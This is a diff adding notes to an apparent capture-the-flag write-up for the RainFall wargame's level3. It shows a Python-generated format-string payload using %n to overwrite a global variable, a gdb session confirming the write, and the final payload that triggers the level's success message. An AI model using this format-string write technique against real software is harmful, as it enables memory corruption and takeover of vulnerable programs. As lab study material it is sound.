@@ -56,3 +56,50 @@ commande:
 result:
     AAAA|1=0x200|2=0xb7fd1ac0|3=0xb7ff37d0|4=0x41414141|5=0x253d317c|6=0x7c702431|7=0x32253d32|8=0x337c7024|9=0x2433253d|10=0x3d347c70|11=0x70243425|12=0x253d357c|13=0x7c702435|14=0x36253d36|15=0x377c7024
 
+===========================================================================================
+
+payload:
+    python -c 'print "\x8c\x98\x04\x08%4p%64x%4$n"' > /tmp/payload
+
+result in gdb:
+    (gdb) b *0x080484d5
+    Breakpoint 1 at 0x80484d5
+    (gdb) r < /tmp/payload
+    Starting program: /home/user/level3/level3 < /tmp/payload
+
+    Breakpoint 1, 0x080484d5 in v ()
+    (gdb) info register
+    eax            0xbffff520	-1073744608
+    ecx            0xb7fda010	-1208115184
+    edx            0xb7fd28c4	-1208145724
+    ebx            0xb7fd0ff4	-1208152076
+    esp            0xbffff510	0xbffff510
+    ebp            0xbffff728	0xbffff728
+    esi            0x0	0
+    edi            0x0	0
+    eip            0x80484d5	0x80484d5 <v+49>
+    eflags         0x200286	[ PF SF IF ID ]
+    cs             0x73	115
+    ss             0x7b	123
+    ds             0x7b	123
+    es             0x7b	123
+    fs             0x0	0
+    gs             0x33	51
+    (gdb) watch m
+    Hardware watchpoint 2: m
+    (gdb) ni
+    Hardware watchpoint 2: m
+
+    Old value = 0
+    New value = 73
+    0xb7e71e2f in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+    (gdb)
+
+
+==========================================================================================
+
+new playload + output out of gdb
+    level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08%60x%4$n"' > /tmp/payload
+    level3@RainFall:~$ ./level3 < /tmp/payload
+    �                                                         200
+    Wait what?!
